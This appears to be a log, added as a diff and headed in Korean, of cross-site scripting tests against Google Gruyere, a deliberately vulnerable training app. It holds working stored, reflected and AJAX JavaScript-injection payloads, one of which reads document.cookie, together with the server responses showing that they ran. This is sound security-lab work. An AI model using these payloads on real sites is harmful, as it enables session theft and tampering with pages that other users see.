@@ -1,0 +1,39 @@
+GID=399820027374159079597995648128134925001
+BASE=https://google-gruyere.appspot.com/399820027374159079597995648128134925001
+
+========================================================================
+(a) 저장형 XSS — 프로필 icon 속성 탈출
+========================================================================
+  변경 전 brie.icon = (필드 없음)
+  요청: GET /saveprofile?action=update&uid=brie&name=Brie&icon=x' onerror='var d=document.createElement("div");d.id="icon-xss";d.textContent="ICON-XSS";document.body.appendChild(d)'
+  변경 후 brie.icon = x\
+  [홈(/)] 렌더된 img 태그 원문: <img alt='' height='32' width='32' src='x' onerror='var d=document.createElement("div");d.id="icon-xss";d.textContent="ICON-XSS";document.body.appendChild(d)''>
+  [홈(/)] 렌더된 img 태그 원문: <img src=x-nonexistent.png onerror="document.title='XSS-EXECUTED';var d=document.createElement('div');d.id='xss-proof';d.textContent='COOKIE='+document.cookie;document.body.appendChild(d)">
+  [/snippets.gtl?uid=brie] 렌더된 img 태그 원문: <img alt='' height='32' width='32' src='x' onerror='var d=document.createElement("div");d.id="icon-xss";d.textContent="ICON-XSS";document.body.appendChild(d)''>
+  [/snippets.gtl?uid=brie] 렌더된 img 태그 원문: <img src=x-nonexistent.png onerror="document.title='XSS-EXECUTED';var d=document.createElement('div');d.id='xss-proof';d.textContent='COOKIE='+document.cookie;document.body.appendChild(d)">
+  비인증 홈에 onerror 노출: True
+
+========================================================================
+(b) 반사형 XSS — 잘못된 경로 반사
+========================================================================
+  요청 경로(인코딩): /x%3Cscript%3Edocument.title%3D%27PATH-XSS%27%3C/script%3E
+  반사된 메시지: Invalid request: /x<script>document.title='PATH-XSS'</script>
+  script 태그가 그대로 반사됨: True
+
+========================================================================
+(c) 반사형(AJAX) — feed.gtl?uid= JS 문자열 인젝션
+========================================================================
+  페이로드: x"] , document.title='FEED-XSS' , ["y
+  응답 원문:
+
+_feed((
+
+
+[
+"x"] , document.title='FEED-XSS' , ["y"
+
+]
+
+
+
+))
